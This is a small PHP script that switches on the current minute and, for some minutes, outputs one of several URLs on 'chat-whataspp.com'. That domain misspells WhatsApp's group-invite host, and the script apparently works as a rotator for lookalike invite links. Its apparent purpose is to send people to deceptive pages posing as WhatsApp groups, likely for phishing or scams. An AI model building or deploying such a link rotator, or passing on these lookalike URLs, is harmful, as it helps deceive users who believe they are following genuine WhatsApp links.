<?php
$v = date("i");

switch ($v) {
    case 0:
        echo "http://chat-whataspp.com/3D1enDyRzQVJ3OdJ9icMBq";
        break;
    case 1:
        echo "";
        break;
    case 2:
        echo "http://chat-whataspp.com/CBQGGfLpKmL20DmYGiq3jJ";
        break;
    case 3:
        echo "";
        break;
    case 4:
        echo "";
        break;
    case 5:
        echo "";
        break;
    case 6:
        echo "http://chat-whataspp.com/Gzk7jybyNSxImX73soRJua";
        break;
    case 7:
        echo "";
        break;
    case 8:
        echo "http://chat-whataspp.com/DkdwoZML1VmDJpSv0Vv5Tq";
        break;
    case 9:
        echo "";
        break;
    case 10:
        echo "";
        break;
    case 11:
        echo "";
        break;
    case 12:
        echo "http://chat-whataspp.com/CBQGGfLpKmL20DmYGiq3jJ";
        break;
    case 13:
        echo "";
        break;
    case 14:
        echo "http://chat-whataspp.com/Gzk7jybyNSxImX73soRJua";
        break;
    case 15:
        echo "";
        break;
    case 16:
        echo "";
        break;
    case 17:
        echo "http://chat-whataspp.com/3D1enDyRzQVJ3OdJ9icMBq";
        break;
    case 18:
        echo "";
        break;
    case 19:
        echo "";
        break;
    case 20:
        echo "http://chat-whataspp.com/DkdwoZML1VmDJpSv0Vv5Tq";
        break;
    case 21:
        echo "";
        break;
    case 22:
        echo "";
        break;
    case 23:
        echo "";
        break;
    case 24:
        echo "http://chat-whataspp.com/Aoy2tBI2MUm8iFtdPJY56g";
        break;
    case 25:
        echo "";
        break;
    case 26:
        echo "";
        break;
    case 27:
        echo "http://chat-whataspp.com/CBQGGfLpKmL20DmYGiq3jJ";
        break;
    case 28:
        echo "";
        break;
    case 29:
        echo "";
        break;
    case 30:
        echo "";
        break;
    case 31:
        echo "http://chat-whataspp.com/DkdwoZML1VmDJpSv0Vv5Tq";
        break;
    case 32:
        echo "";
        break;
    case 33:
        echo "";
        break;
    case 34:
        echo "";
        break;
    case 35:
        echo "http://chat-whataspp.com/Aoy2tBI2MUm8iFtdPJY56g";
        break;
    case 36:
        echo "";
        break;
    case 37:
        echo "";
        break;
    case 38:
        echo "http://chat-whataspp.com/DkdwoZML1VmDJpSv0Vv5Tq";
        break;
    case 39:
        echo "";
        break;
    case 40:
        echo "";
        break;
    case 41:
        echo "http://chat-whataspp.com/CBQGGfLpKmL20DmYGiq3jJ";
        break;
    case 42:
        echo "";
        break;
    case 43:
        echo "";
        break;
    case 44:
        echo "";
        break;
    case 45:
        echo "";
        break;
    case 46:
        echo "http://chat-whataspp.com/3D1enDyRzQVJ3OdJ9icMBq";
        break;
    case 47:
        echo "";
        break;
    case 48:
        echo "http://chat-whataspp.com/CBQGGfLpKmL20DmYGiq3jJ";
        break;
    case 49:
        echo "";
        break;
    case 50:
        echo "";
        break;
    case 51:
        echo "";
        break;
    case 52:
        echo "";
        break;
    case 53:
        echo "http://chat-whataspp.com/KIgtuxcJAMNKcOmvZyvxsH";
        break;
    case 54:
        echo "";
        break;
    case 55:
        echo "http://chat-whataspp.com/Gzk7jybyNSxImX73soRJua";
        break;
    case 56:
        echo "";
        break;
    case 57:
        echo "";
        break;
    case 58:
        echo "http://chat-whataspp.com/LHGxrEyKIPcLQSyVlq430F";
        break;
    case 59:
        echo "";
}
?>